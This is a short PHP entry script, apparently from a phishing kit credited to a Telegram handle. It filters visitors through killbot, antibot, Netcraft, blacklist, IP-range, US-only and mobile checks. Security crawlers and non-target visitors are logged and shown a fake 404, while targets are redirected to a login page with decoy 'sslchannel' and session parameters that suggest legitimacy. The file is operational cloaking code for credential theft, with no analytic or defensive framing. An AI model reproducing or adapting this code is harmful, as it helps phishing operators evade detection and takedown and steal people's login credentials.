<?php
// @Kr3pto on telegram

require "configg.php";
require "si_assetz/cinc/functions.php";
require "si_assetz/old_blocker.php";
if($enable_killbot == 1){
	if(checkkillbot($killbot_key) == true){
		$fp = fopen("si_assetz/cinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
header("Connection: close\r\n");
http_response_code(404);
exit;
	}
}
if($mobile_lock == 1){
	require "si_assetz/mob_lock.php";
}
if($US_lock == 1){
	if(onlyus() == true){
	
	}else{
		$fp = fopen("si_assetz/cinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
header("Connection: close\r\n");
http_response_code(404);
exit;
	}
}
if($external_antibot == 1){
	if(checkBot($apikey) == true){
		$fp = fopen("si_assetz/cinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
header("Connection: close\r\n");
http_response_code(404);
exit;
	}
}
$rand = generateRandomString(130);
require "si_assetz/cinc/visitor_log.php";
require "si_assetz/cinc/netcraft_check.php";
require "si_assetz/cinc/blacklist_lookup.php";
require "si_assetz/cinc/ip_range_check.php";
header("location:Login.php?sslchannel=true&sessionid=$rand");
?>
<a rel="nofollow" style="display:none;" href="steve/">steve</a>